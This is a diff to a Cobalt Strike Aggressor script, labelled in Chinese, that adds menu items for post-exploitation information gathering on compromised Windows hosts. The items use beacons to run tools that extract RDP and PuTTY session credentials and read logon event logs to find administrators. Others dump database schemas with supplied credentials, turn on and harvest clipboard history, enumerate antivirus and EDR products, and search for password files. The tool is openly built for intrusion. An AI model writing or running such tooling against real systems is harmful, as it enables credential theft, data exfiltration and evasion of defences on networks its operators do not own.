@@ -18,7 +18,6 @@ menu "信息收集" {
             drow_checkbox($dialog, "cmd", "查看cmd历史命令", "");
             drow_checkbox($dialog, "powershell", "查看powershell历史命令", "");
             drow_checkbox($dialog, "recenttest", "查看文件浏览历史", "");
-            drow_checkbox($dialog, "recent_ladon", "查看文件浏览历史-ladon", "");
             drow_checkbox($dialog, "smb", "查看SMB指向路径", "");
             drow_checkbox($dialog, "brief", "查看安装程序和版本信息", "");
             drow_checkbox($dialog, "hotfixid", "查看安装的补丁", "");
@@ -118,12 +117,6 @@ sub recenttest{
     bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
 }
 
-sub recent_ladon{
-    btask($bid, "#######################", "");
-    btask($bid, "##  查看文件浏览历史  ##", "");
-	btask($bid, "#######################", "");
-    bexecute_assembly($bid, script_resource("/script/Ladon.exe"), "Recent");
-}
 
 sub smb{
     btask($bid, "########################", "");
@@ -370,6 +363,20 @@ sub domain_online{
 
 
 
+			item "扫描web应用" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,8080,8001,1433",bid => $bid), &SharpWebScan);
+			dialog_description($dialog, "扫描web应用,返回web地址和title。");
+			drow_text($dialog, "ip", "ip:  ");	
+			drow_text($dialog, "port", "ports:  ");			
+			drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+       }
+sub SharpWebScan {
+	$arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
+	bexecute_assembly($bid, script_resource("/script/SharpWebScan.exe"), $arg);
+}
 
     menu "查看mstsc记录"{
 	            item "查看所有用户的记录"{
@@ -398,6 +405,9 @@ sub listlogs {
                 dbutton_action($Dialog, "运行");
                 dialog_show($Dialog);
             }
+				item "获取RDP与putty信息"{
+				bexecute_assembly($1, script_resource('/script/SessionSearcher.exe'), "");
+            }
 }
 sub listlog {
 	local('$script');
@@ -412,7 +422,8 @@ sub listlog {
 
 }
 
-	        item "SharpEventLog" {
+
+	        item "获取系统登录日志" {
 			$bid = $1;
 			$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
 			dialog_description($dialog, "获取Windows登录事件日志：读取登录过本机的登录失败或登录成功（4624,4625）的所有计算机信息，在内网渗透中快速定位运维管理人员。");
@@ -423,21 +434,8 @@ sub listlog {
 sub SharpEventLog {
 	bexecute_assembly($bid, script_resource("/script/SharpEventLog.exe"), $3['EventLogType']);
 }
-			item "SharpWebScan" {
-			$bid = $1['@'];
-			$dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,8080,8001,1433",bid => $bid), &SharpWebScan);
-			dialog_description($dialog, "扫描web应用,返回web地址和title。");
-			drow_text($dialog, "ip", "ip:  ");	
-			drow_text($dialog, "port", "ports:  ");			
-			drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
-            dbutton_action($dialog, "运行");
-			dialog_show($dialog);
-        }
-sub SharpWebScan {
-	$arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
-	bexecute_assembly($bid, script_resource("/script/SharpWebScan.exe"), $arg);
-}
-			item "SharpCheckInfo" {
+
+			item "获取回收站等信息" {
 			$bid = $1;
 			$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
 			dialog_description($dialog, "收集目标主机信息，包括最近打开的文件，系统环境变量和回收站文件等等。");
@@ -448,7 +446,7 @@ sub SharpWebScan {
 sub SharpCheckInfo {
 	bexecute_assembly($bid, script_resource("/script/SharpCheckInfo.exe"), $3['Type']);
 }
-			item "SharpSQLDump" {
+			item "获取数据库数据" {
 			$bid = $1['@'];
 			$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
 			dialog_description($dialog, "内网渗透中快速获取数据库所有库名，表名，列名。具体判断后再去翻数据，节省时间。适用于mysql，mssql。");
@@ -463,11 +461,18 @@ sub SharpSQLDump {
 		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
 		bexecute_assembly($bid, script_resource("/script/SharpSQLDump.exe"), $arg);
 }	
-		item "SharpClipHistory" {
-			bexecute_assembly($1, script_resource("/script/SharpClipHistory.exe"), "");
+menu "获取剪切板信息" {
+		item "开启剪切板记录" {
+			bexecute_assembly($1, script_resource("/script/SharpClipHistory.exe"), "--enableHistory");
 		}
 
-	        item "SharpAVKB" {
+		item "获取剪切板信息" {
+			bexecute_assembly($1, script_resource("/script/SharpClipHistory.exe"), "");
+		}
+		}
+		
+
+	        item "获取杀软信息" {
 			$bid = $1;
 			$dialog = dialog("SharpAVKB", %(type => "-AV",bid => $bid), &SharpAVKB);
 			dialog_description($dialog, "Windows杀软对比和补丁号对比。");
@@ -477,7 +482,29 @@ sub SharpSQLDump {
         }
 sub SharpAVKB {
 	bexecute_assembly($bid, script_resource("/script/SharpAVKB.exe"), $3['type']);
-}	
+}
+
+		item "获取EDR信息" {
+			bexecute_assembly($1, script_resource("/script/SharpEDRChecker.exe"), "");
+		}	
+		
+			item "文件搜索" {
+			$bid = $1['@'];
+			$dialog = dialog("文件搜索", %(path => "C:\\",file => "payload.exe||passwords*||*.txt",bid => $bid), &SharpDir);
+			dialog_description($dialog, "文件搜索,三种搜索方式，指定文件名、制定文件名搜索后缀、搜索指定后缀文件。");
+			drow_text($dialog, "path", "path:  ");	
+			drow_text($dialog, "file", "file:  ");	
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpDir {
+		$arg = join(' ', @($3['path'],$3['file']));
+		bexecute_assembly($bid, script_resource("/script/SharpDir.exe"), $arg);
+}
+
+
+
+	
 	
 			
 	}
